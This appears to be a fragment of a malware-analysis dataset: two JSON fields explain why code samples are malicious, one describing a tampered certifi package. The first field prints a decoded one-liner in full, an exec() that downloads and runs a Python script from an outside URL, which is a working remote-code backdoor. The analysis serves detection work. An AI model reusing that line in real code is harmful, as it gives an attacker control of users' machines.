      "malicious_behavior": "The provided code is malicious. It imports two symbols from a local module, but the main malicious behavior is in the use of exec() on a base64-decoded string. Decoding the base64 string reveals the following code: exec(__import__(\"importlib\").import_module(\"urllib.request\").urlopen(\"https://cyberresearch.pythonanywhere.com/reporter.py\").read().decode()). This code downloads and executes a remote Python script from the specified URL. This is a classic remote code execution (RCE) backdoor, allowing the attacker to run arbitrary code on the victim's machine. Such behavior is highly dangerous, as it can lead to data theft, system compromise, or further malware installation. The use of obfuscation (base64 encoding and dynamic import) is a common technique to evade detection.",

      "malicious_behavior": "The code exhibits several indicators of malicious behavior. First, it imports two suspiciously named objects (FrTLLlBholzVBEabuVfcvWjeDDgfWYlU and ydnkRFNyIMsBAYxmUJoeCnvHkIjFJCMY) from the certifi package, which does not export such symbols in any legitimate version. This suggests the certifi package has been tampered with or replaced by a malicious version. The code then parses command-line arguments and, based on the presence of a flag, calls one of these imported objects as a function and prints its result. Since these objects are not part of the real certifi package, they could execute arbitrary code, exfiltrate data, or perform other harmful actions. The use of obfuscated variable and function names further suggests an attempt to evade detection. In summary, this code is highly likely to be malicious, as it relies on a compromised package to execute unknown and potentially harmful code.",
